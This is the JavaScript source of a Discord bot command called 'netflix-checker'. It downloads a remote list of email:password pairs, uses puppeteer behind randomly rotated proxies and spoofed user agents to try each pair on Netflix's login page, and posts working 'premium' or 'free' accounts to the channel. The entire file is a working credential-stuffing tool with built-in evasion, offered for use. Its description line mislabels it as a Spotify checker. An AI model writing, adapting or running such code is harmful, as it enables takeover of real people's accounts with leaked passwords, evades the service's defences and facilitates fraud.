const fs = require("fs");
const { RichEmbed } = require("discord.js");
const puppeteer = require("puppeteer");
const fetch = require("node-fetch");
const {
  getUserAgent,
  getRandomInt,
  downloadAndGetRandomProxy
} = require("../../utils");
const { prefix } = require("../../config");
const { runner: proxyRunner } = require("./proxy");

const document = {};
const URL = "https://www.netflix.com/login";

const getPuppeteerOptions = async url => {
  const { ipAndPort } = await proxyRunner();
  const proxy = `${ipAndPort[getRandomInt(0, ipAndPort.length)]}`;

  return {
    args: [
      "--disable-gpu",
      "--disable-dev-shm-usage",
      "--disable-setuid-sandbox",
      "--no-first-run",
      "--no-sandbox",
      "--no-zygote",
      `--proxy-server=${proxy}`
    ]
  };
};

const getCredentials = url => fetch(url).then(res => res.text());

let error_count = 0;
let error_message = "";

const checkCredentials = async (
  { browser, credentials, message, msg },
  index,
  maxIndex
) => {
  try {
    if (index < (maxIndex || credentials.length)) {
      const email = credentials[index].substring(
        0,
        credentials[index].indexOf(":")
      );
      const password = credentials[index].substring(
        credentials[index].indexOf(":") + 1
      );

      msg.edit(
        `Checking... (${index + 1}/${
          credentials.length
        })\nError: ${error_count}\nMessage: ${error_message}`
      );

      const page = await browser.newPage();

      await page.setUserAgent(getUserAgent());
      await page.goto(URL, {
        waitUntil: "networkidle0"
      });
      await page.focus("input[id=id_userLoginId]");
      await page.keyboard.type(email);
      await page.focus("input[id=id_password]");
      await page.keyboard.type(password);
      await page.click(".login-button");
      await page.waitFor(3000);

      const cred_status = await page.evaluate(() => {
        if (document.querySelector(".ui-message-contents")) {
          return "failed";
        }

        if (document.querySelector(".free-trial-card")) {
          return "free";
        }

        if (document.querySelector(".profile-gate-label")) {
          return "premium";
        }
      });

      if (cred_status === "premium" || cred_status === "free") {
        message.channel.send(`${cred_status} -> ${email}:${password}`);

        await browser.close();
        const puppeteerOptions = await getPuppeteerOptions(URL);
        const newBrowser = await puppeteer.launch(puppeteerOptions);
        checkCredentials(
          { browser: newBrowser, credentials, message, msg },
          index + 1,
          maxIndex
        );
      }

      if (cred_status === "failed") {
        await page.close();
        checkCredentials(
          { browser, credentials, message, msg },
          index + 1,
          maxIndex
        );
      }
    }
  } catch (err) {
    error_count++;
    // eslint-disable-next-line require-atomic-updates
    error_message = err;
    await browser.close();
    const puppeteerOptions = await getPuppeteerOptions(URL);
    const newBrowser = await puppeteer.launch(puppeteerOptions);
    checkCredentials(
      { browser: newBrowser, credentials, message, msg },
      index + 1,
      maxIndex
    );
  }
};

module.exports = {
  name: "netflix-checker",
  aliases: ["nc"],
  description: "Check spotify accounts from a list",
  args: true,
  usage: `http://example.com/file.txt 1 12`,
  devOnly: true,
  async execute(message, args) {
    const initialIndex = parseInt(args[1], 10) || 0;
    const maxIndex = parseInt(args[2], 10) || 0;
    const textResult = await getCredentials(args[0]);
    const credentials = textResult
      .split("\n")
      .map(
        cred => cred.includes("@") && cred.substring(0, cred.lastIndexOf(":"))
      )
      .filter(val => !!val);

    const puppeteerOptions = await getPuppeteerOptions(URL);
    const browser = await puppeteer.launch(puppeteerOptions);

    return message.channel.send("Please wait...").then(async msg => {
      await checkCredentials(
        {
          browser,
          credentials,
          message,
          msg
        },
        initialIndex,
        maxIndex
      );
    });
  }
};
